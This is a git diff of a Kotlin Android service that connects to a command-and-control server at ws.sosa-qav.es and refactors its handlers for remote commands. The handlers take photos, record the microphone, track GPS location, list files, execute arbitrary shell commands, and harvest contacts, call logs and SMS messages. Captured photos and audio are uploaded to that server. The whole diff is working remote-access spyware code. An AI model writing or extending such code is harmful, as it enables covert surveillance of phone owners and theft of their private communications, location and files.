@@ -126,35 +126,6 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
     private var isC2Connected = false
     private val reconnectScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     
-    // Location tracking
-    private var currentLocationRequest: String? = null
-    private val locationListener = object : LocationListener {
-        override fun onLocationChanged(location: Location) {
-            val requestId = currentLocationRequest
-            if (requestId != null) {
-                currentLocationRequest = null
-                locationManager?.removeUpdates(this)
-                
-                val result = JSONObject().apply {
-                    put("latitude", location.latitude)
-                    put("longitude", location.longitude)
-                    put("accuracy", location.accuracy)
-                    put("altitude", location.altitude)
-                    put("speed", location.speed)
-                    put("bearing", location.bearing)
-                    put("timestamp", location.time)
-                    put("provider", location.provider)
-                }
-                
-                sendSuccessResult(CMD_GET_LOCATION, requestId, result)
-            }
-        }
-        
-        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
-        override fun onProviderEnabled(provider: String) {}
-        override fun onProviderDisabled(provider: String) {}
-    }
-    
     // Broadcast receiver for IPC commands
     private val commandReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -242,7 +213,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         try {
             socketIOClient = NativeSocketIOClient(this, this)
             
-            // Get C2 server URL from config - Updated to match your config
+            // Get C2 server URL from config
             val serverUrl = "wss://ws.sosa-qav.es" // This should match your config
             
             socketIOClient?.initialize(serverUrl, deviceId)
@@ -422,8 +393,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         }
     }
     
-    // ==================== COMMAND HANDLERS ====================
-    
+    // CAMERA IMPLEMENTATION
     private fun handleTakePicture(args: JSONObject, requestId: String) {
         if (!hasPermission(android.Manifest.permission.CAMERA)) {
             sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera permission not granted")
@@ -457,7 +427,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                     }
                     
                     sendSuccessResult(CMD_TAKE_PICTURE, requestId, result)
-                    uploadFile(photoFile, CMD_TAKE_PICTURE, requestId)
+                    uploadFile(photoFile, CMD_TAKE_PICTURE)
                     cleanupCamera()
                     
                 }, backgroundHandler)
@@ -489,6 +459,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         }
     }
     
+    // AUDIO RECORDING IMPLEMENTATION
     private fun handleRecordAudio(args: JSONObject, requestId: String) {
         if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
             sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording permission not granted")
@@ -497,61 +468,71 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         
         backgroundExecutor.execute {
             try {
-                val duration = args.optInt("duration", 10) // Default 10 seconds
-                val quality = args.optString("quality", "medium") // medium or high
+                val duration = args.optInt("duration", 10) // seconds
+                val quality = args.optString("quality", "medium")
                 
                 val audioFile = createAudioFile()
                 
-                // Setup MediaRecorder
+                // Setup MediaRecorder for high-quality recording
                 mediaRecorder = MediaRecorder().apply {
                     setAudioSource(MediaRecorder.AudioSource.MIC)
                     setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                     setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                    setOutputFile(audioFile.absolutePath)
+                    
                     if (quality == "high") {
                         setAudioEncodingBitRate(128000)
                         setAudioSamplingRate(44100)
                     } else {
                         setAudioEncodingBitRate(64000)
-                        setAudioSamplingRate(8000)
+                        setAudioSamplingRate(22050)
                     }
-                    setOutputFile(audioFile.absolutePath)
                     
+                    prepare()
+                    start()
+                }
+                
+                Log.d(TAG, "Audio recording started for ${duration}s")
+                
+                // Record for specified duration
+                Thread.sleep(duration * 1000L)
+                
+                mediaRecorder?.apply {
+                    stop()
+                    reset()
+                    release()
+                }
+                mediaRecorder = null
+                
+                val result = JSONObject().apply {
+                    put("path", audioFile.absolutePath)
+                    put("size", audioFile.length())
+                    put("duration", duration)
+                    put("quality", quality)
+                    put("format", "3gp")
+                }
+                
+                sendSuccessResult(CMD_RECORD_AUDIO, requestId, result)
+                uploadFile(audioFile, CMD_RECORD_AUDIO)
+                
+            } catch (e: Exception) {
+                Log.e(TAG, "Audio recording failed", e)
+                mediaRecorder?.apply {
                     try {
-                        prepare()
-                        start()
-                        Log.d(TAG, "Started audio recording for ${duration}s")
-                        
-                        // Record for specified duration
-                        Thread.sleep((duration * 1000).toLong())
-                        
                         stop()
                         reset()
                         release()
-                        
-                        val result = JSONObject().apply {
-                            put("path", audioFile.absolutePath)
-                            put("size", audioFile.length())
-                            put("duration", duration)
-                            put("quality", quality)
-                            put("format", "3gp")
-                        }
-                        
-                        sendSuccessResult(CMD_RECORD_AUDIO, requestId, result)
-                        uploadFile(audioFile, CMD_RECORD_AUDIO, requestId)
-                        
-                    } catch (e: Exception) {
-                        Log.e(TAG, "MediaRecorder error", e)
-                        sendErrorResult(CMD_RECORD_AUDIO, requestId, "Recording failed: ${e.message}")
+                    } catch (ex: Exception) {
+                        Log.e(TAG, "Error cleaning up media recorder", ex)
                     }
                 }
-                
-            } catch (e: Exception) {
-                Log.e(TAG, "Audio recording setup failed", e)
-                sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio setup failed: ${e.message}")
+                mediaRecorder = null
+                sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording failed: ${e.message}")
             }
         }
     }
     
+    // LOCATION IMPLEMENTATION
     private fun handleGetLocation(args: JSONObject, requestId: String) {
         if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) && 
             !hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
@@ -561,70 +542,62 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         
         backgroundExecutor.execute {
             try {
-                currentLocationRequest = requestId
-                
-                // Try to get last known location first
-                val lastKnownLocation = try {
-                    locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                        ?: locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                } catch (se: SecurityException) {
-                    null
-                }
-                
-                if (lastKnownLocation != null && 
-                    (System.currentTimeMillis() - lastKnownLocation.time) < 300000) { // 5 minutes
-                    
-                    currentLocationRequest = null
-                    val result = JSONObject().apply {
-                        put("latitude", lastKnownLocation.latitude)
-                        put("longitude", lastKnownLocation.longitude)
-                        put("accuracy", lastKnownLocation.accuracy)
-                        put("altitude", lastKnownLocation.altitude)
-                        put("speed", lastKnownLocation.speed)
-                        put("bearing", lastKnownLocation.bearing)
-                        put("timestamp", lastKnownLocation.time)
-                        put("provider", lastKnownLocation.provider)
-                        put("source", "cached")
-                    }
-                    
-                    sendSuccessResult(CMD_GET_LOCATION, requestId, result)
-                    return@execute
-                }
-                
-                // Request fresh location
-                try {
-                    val provider = when {
-                        locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true -> 
-                            LocationManager.GPS_PROVIDER
-                        locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true -> 
-                            LocationManager.NETWORK_PROVIDER
-                        else -> {
-                            sendErrorResult(CMD_GET_LOCATION, requestId, "No location providers available")
-                            return@execute
+                val locationListener = object : LocationListener {
+                    override fun onLocationChanged(location: Location) {
+                        val result = JSONObject().apply {
+                            put("latitude", location.latitude)
+                            put("longitude", location.longitude)
+                            put("accuracy", location.accuracy)
+                            put("altitude", location.altitude)
+                            put("speed", location.speed)
+                            put("timestamp", location.time)
+                            put("provider", location.provider)
                         }
+                        
+                        sendSuccessResult(CMD_GET_LOCATION, requestId, result)
+                        locationManager?.removeUpdates(this)
                     }
                     
-                    locationManager?.requestLocationUpdates(
-                        provider,
-                        1000L, // 1 second
-                        0f,    // 0 meters
-                        locationListener
-                    )
-                    
-                    // Timeout after 30 seconds
-                    backgroundExecutor.execute {
-                        Thread.sleep(30000)
-                        if (currentLocationRequest == requestId) {
-                            currentLocationRequest = null
-                            locationManager?.removeUpdates(locationListener)
-                            sendErrorResult(CMD_GET_LOCATION, requestId, "Location request timeout")
-                        }
-                    }
-                    
-                } catch (se: SecurityException) {
-                    sendErrorResult(CMD_GET_LOCATION, requestId, "Location permission denied: ${se.message}")
+                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                    override fun onProviderEnabled(provider: String) {}
+                    override fun onProviderDisabled(provider: String) {}
                 }
                 
+                // Try GPS first, then network
+                val gpsEnabled = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) ?: false
+                val networkEnabled = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) ?: false
+                
+                when {
+                    gpsEnabled -> {
+                        locationManager?.requestLocationUpdates(
+                            LocationManager.GPS_PROVIDER, 
+                            0L, 
+                            0f, 
+                            locationListener
+                        )
+                    }
+                    networkEnabled -> {
+                        locationManager?.requestLocationUpdates(
+                            LocationManager.NETWORK_PROVIDER, 
+                            0L, 
+                            0f, 
+                            locationListener
+                        )
+                    }
+                    else -> {
+                        sendErrorResult(CMD_GET_LOCATION, requestId, "No location providers available")
+                        return@execute
+                    }
+                }
+                
+                // Timeout after 30 seconds
+                backgroundExecutor.execute {
+                    Thread.sleep(30000)
+                    locationManager?.removeUpdates(locationListener)
+                }
+                
+            } catch (e: SecurityException) {
+                sendErrorResult(CMD_GET_LOCATION, requestId, "Location permission denied: ${e.message}")
             } catch (e: Exception) {
                 Log.e(TAG, "Location request failed", e)
                 sendErrorResult(CMD_GET_LOCATION, requestId, "Location request failed: ${e.message}")
@@ -632,53 +605,43 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         }
     }
     
+    // FILE LISTING IMPLEMENTATION
     private fun handleListFiles(args: JSONObject, requestId: String) {
         backgroundExecutor.execute {
             try {
-                val path = args.optString("path", "/storage/emulated/0")
-                val directory = File(path)
+                val pathToList = args.optString("path", "/storage/emulated/0")
+                val directory = File(pathToList)
                 
                 if (!directory.exists()) {
-                    sendErrorResult(CMD_LIST_FILES, requestId, "Directory does not exist: $path")
+                    sendErrorResult(CMD_LIST_FILES, requestId, "Directory does not exist: $pathToList")
                     return@execute
                 }
                 
                 if (!directory.isDirectory) {
-                    sendErrorResult(CMD_LIST_FILES, requestId, "Path is not a directory: $path")
+                    sendErrorResult(CMD_LIST_FILES, requestId, "Path is not a directory: $pathToList")
                     return@execute
                 }
                 
                 val files = directory.listFiles()
-                if (files == null) {
-                    sendErrorResult(CMD_LIST_FILES, requestId, "Cannot access directory: $path")
-                    return@execute
-                }
-                
                 val fileList = JSONArray()
-                var totalFiles = 0
                 
-                for (file in files) {
-                    try {
-                        val fileInfo = JSONObject().apply {
-                            put("name", file.name)
-                            put("isDirectory", file.isDirectory)
-                            put("size", if (file.isFile) file.length() else 0)
-                            put("lastModified", file.lastModified())
-                            put("canRead", file.canRead())
-                            put("canWrite", file.canWrite())
-                            put("path", file.absolutePath)
-                        }
-                        fileList.put(fileInfo)
-                        totalFiles++
-                    } catch (e: Exception) {
-                        Log.w(TAG, "Error getting file info for: ${file.name}", e)
+                files?.forEach { file ->
+                    val fileInfo = JSONObject().apply {
+                        put("name", file.name)
+                        put("path", file.absolutePath)
+                        put("size", file.length())
+                        put("isDirectory", file.isDirectory)
+                        put("lastModified", file.lastModified())
+                        put("canRead", file.canRead())
+                        put("canWrite", file.canWrite())
                     }
+                    fileList.put(fileInfo)
                 }
                 
                 val result = JSONObject().apply {
-                    put("path", path)
-                    put("totalFiles", totalFiles)
+                    put("path", pathToList)
                     put("files", fileList)
+                    put("totalFiles", fileList.length())
                 }
                 
                 sendSuccessResult(CMD_LIST_FILES, requestId, result)
@@ -690,49 +653,35 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         }
     }
     
+    // SHELL EXECUTION IMPLEMENTATION
     private fun handleExecuteShell(args: JSONObject, requestId: String) {
         backgroundExecutor.execute {
             try {
                 val commandName = args.optString("command_name", "ls")
-                val commandArgs = args.optJSONArray("command_args")
+                val commandArgs = args.optJSONArray("command_args") ?: JSONArray()
                 
-                val command = mutableListOf<String>().apply {
+                val fullCommand = mutableListOf<String>().apply {
                     add(commandName)
-                    if (commandArgs != null) {
-                        for (i in 0 until commandArgs.length()) {
-                            add(commandArgs.getString(i))
-                        }
+                    for (i in 0 until commandArgs.length()) {
+                        add(commandArgs.getString(i))
                     }
                 }
                 
-                Log.d(TAG, "Executing shell command: ${command.joinToString(" ")}")
+                Log.d(TAG, "Executing shell command: ${fullCommand.joinToString(" ")}")
                 
-                val processBuilder = ProcessBuilder(command)
-                processBuilder.redirectErrorStream(false)
-                
+                val processBuilder = ProcessBuilder(fullCommand)
                 val process = processBuilder.start()
                 
-                // Read stdout
-                val stdout = process.inputStream.bufferedReader().use { it.readText() }
-                
-                // Read stderr
-                val stderr = process.errorStream.bufferedReader().use { it.readText() }
-                
-                // Wait for process to complete with timeout
-                val completed = process.waitFor(30, TimeUnit.SECONDS)
-                val exitCode = if (completed) process.exitValue() else -1
-                
-                if (!completed) {
-                    process.destroyForcibly()
-                }
+                val stdout = process.inputStream.bufferedReader().readText()
+                val stderr = process.errorStream.bufferedReader().readText()
+                val exitCode = process.waitFor()
                 
                 val result = JSONObject().apply {
                     put("command", commandName)
-                    put("args", args.optJSONArray("command_args") ?: JSONArray())
+                    put("args", commandArgs)
                     put("exitCode", exitCode)
                     put("stdout", stdout)
                     put("stderr", stderr)
-                    put("completed", completed)
                 }
                 
                 sendSuccessResult(CMD_EXECUTE_SHELL, requestId, result)
@@ -744,6 +693,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         }
     }
     
+    // CONTACTS IMPLEMENTATION
     private fun handleGetContacts(args: JSONObject, requestId: String) {
         if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
             sendErrorResult(CMD_GET_CONTACTS, requestId, "Contacts permission not granted")
@@ -753,30 +703,23 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         backgroundExecutor.execute {
             try {
                 val contacts = JSONArray()
-                val projection = arrayOf(
-                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Phone.NUMBER
-                )
-                
                 val cursor: Cursor? = contentResolver.query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    projection,
-                    null,
-                    null,
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+                    arrayOf(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        ContactsContract.CommonDataKinds.Phone.NUMBER
+                    ),
+                    null, null, null
                 )
                 
                 cursor?.use {
-                    val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-                    val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                    val idIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
-                    
                     while (it.moveToNext()) {
+                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                        val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                        
                         val contact = JSONObject().apply {
-                            put("id", it.getString(idIndex))
-                            put("name", it.getString(nameIndex))
-                            put("number", it.getString(numberIndex))
+                            put("name", name ?: "Unknown")
+                            put("number", number ?: "Unknown")
                         }
                         contacts.put(contact)
                     }
@@ -790,12 +733,13 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                 sendSuccessResult(CMD_GET_CONTACTS, requestId, result)
                 
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to get contacts", e)
-                sendErrorResult(CMD_GET_CONTACTS, requestId, "Failed to get contacts: ${e.message}")
+                Log.e(TAG, "Contacts retrieval failed", e)
+                sendErrorResult(CMD_GET_CONTACTS, requestId, "Contacts retrieval failed: ${e.message}")
             }
         }
     }
     
+    // CALL LOGS IMPLEMENTATION
     private fun handleGetCallLogs(args: JSONObject, requestId: String) {
         if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
             sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Call log permission not granted")
@@ -805,40 +749,37 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         backgroundExecutor.execute {
             try {
                 val callLogs = JSONArray()
-                val projection = arrayOf(
-                    CallLog.Calls.NUMBER,
-                    CallLog.Calls.TYPE,
-                    CallLog.Calls.DATE,
-                    CallLog.Calls.DURATION
-                )
-                
                 val cursor: Cursor? = contentResolver.query(
                     CallLog.Calls.CONTENT_URI,
-                    projection,
-                    null,
-                    null,
-                    CallLog.Calls.DATE + " DESC LIMIT 100"
+                    arrayOf(
+                        CallLog.Calls.NUMBER,
+                        CallLog.Calls.TYPE,
+                        CallLog.Calls.DATE,
+                        CallLog.Calls.DURATION
+                    ),
+                    null, null, 
+                    "${CallLog.Calls.DATE} DESC"
                 )
                 
                 cursor?.use {
-                    val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
-                    val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
-                    val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
-                    val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
-                    
                     while (it.moveToNext()) {
-                        val callType = when (it.getInt(typeIndex)) {
-                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
-                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
-                            CallLog.Calls.MISSED_TYPE -> "MISSED"
-                            else -> "UNKNOWN"
+                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
+                        val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
+                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
+                        val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
+                        
+                        val typeString = when (type) {
+                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                            CallLog.Calls.MISSED_TYPE -> "Missed"
+                            else -> "Unknown"
                         }
                         
                         val callLog = JSONObject().apply {
-                            put("number", it.getString(numberIndex))
-                            put("type", callType)
-                            put("date", it.getLong(dateIndex))
-                            put("duration", it.getInt(durationIndex))
+                            put("number", number ?: "Unknown")
+                            put("type", typeString)
+                            put("date", date)
+                            put("duration", duration)
                         }
                         callLogs.put(callLog)
                     }
@@ -852,12 +793,13 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                 sendSuccessResult(CMD_GET_CALL_LOGS, requestId, result)
                 
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to get call logs", e)
-                sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Failed to get call logs: ${e.message}")
+                Log.e(TAG, "Call logs retrieval failed", e)
+                sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Call logs retrieval failed: ${e.message}")
             }
         }
     }
     
+    // SMS IMPLEMENTATION
     private fun handleGetSMS(args: JSONObject, requestId: String) {
         if (!hasPermission(android.Manifest.permission.READ_SMS)) {
             sendErrorResult(CMD_GET_SMS, requestId, "SMS permission not granted")
@@ -867,41 +809,37 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         backgroundExecutor.execute {
             try {
                 val smsMessages = JSONArray()
-                val projection = arrayOf(
-                    Telephony.Sms.ADDRESS,
-                    Telephony.Sms.BODY,
-                    Telephony.Sms.DATE,
-                    Telephony.Sms.TYPE
-                )
-                
                 val cursor: Cursor? = contentResolver.query(
                     Telephony.Sms.CONTENT_URI,
-                    projection,
-                    null,
-                    null,
-                    Telephony.Sms.DATE + " DESC LIMIT 100"
+                    arrayOf(
+                        Telephony.Sms.ADDRESS,
+                        Telephony.Sms.BODY,
+                        Telephony.Sms.DATE,
+                        Telephony.Sms.TYPE
+                    ),
+                    null, null,
+                    "${Telephony.Sms.DATE} DESC"
                 )
                 
                 cursor?.use {
-                    val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
-                    val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
-                    val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
-                    val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
-                    
                     while (it.moveToNext()) {
-                        val messageType = when (it.getInt(typeIndex)) {
-                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "RECEIVED"
-                            Telephony.Sms.MESSAGE_TYPE_SENT -> "SENT"
-                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "DRAFT"
-                            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "OUTBOX"
-                            else -> "UNKNOWN"
+                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
+                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
+                        val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
+                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
+                        
+                        val typeString = when (type) {
+                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "Received"
+                            Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
+                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
+                            else -> "Unknown"
                         }
                         
                         val sms = JSONObject().apply {
-                            put("address", it.getString(addressIndex))
-                            put("body", it.getString(bodyIndex))
-                            put("date", it.getLong(dateIndex))
-                            put("type", messageType)
+                            put("address", address ?: "Unknown")
+                            put("body", body ?: "")
+                            put("date", date)
+                            put("type", typeString)
                         }
                         smsMessages.put(sms)
                     }
@@ -915,14 +853,13 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                 sendSuccessResult(CMD_GET_SMS, requestId, result)
                 
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to get SMS messages", e)
-                sendErrorResult(CMD_GET_SMS, requestId, "Failed to get SMS messages: ${e.message}")
+                Log.e(TAG, "SMS retrieval failed", e)
+                sendErrorResult(CMD_GET_SMS, requestId, "SMS retrieval failed: ${e.message}")
             }
         }
     }
     
-    // ==================== HELPER METHODS ====================
-    
+    // HELPER METHODS
     private fun sendSuccessResult(command: String, requestId: String, result: JSONObject) {
         result.put("requestId", requestId)
         result.put("timestamp", System.currentTimeMillis())
@@ -967,7 +904,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         sendBroadcast(intent)
     }
     
-    private fun uploadFile(file: File, commandRef: String, requestId: String) {
+    private fun uploadFile(file: File, commandRef: String) {
         backgroundExecutor.execute {
             try {
                 val serverUrl = "https://ws.sosa-qav.es/upload_command_file"
@@ -1167,13 +1104,6 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         // Cancel connection monitoring
         connectionCheckJob?.cancel()
         reconnectScope.cancel()
-        
-        // Stop location updates
-        try {
-            locationManager?.removeUpdates(locationListener)
-        } catch (e: Exception) {
-            Log.e(TAG, "Error removing location updates", e)
-        }
         
         // Unregister broadcast receiver
         try {
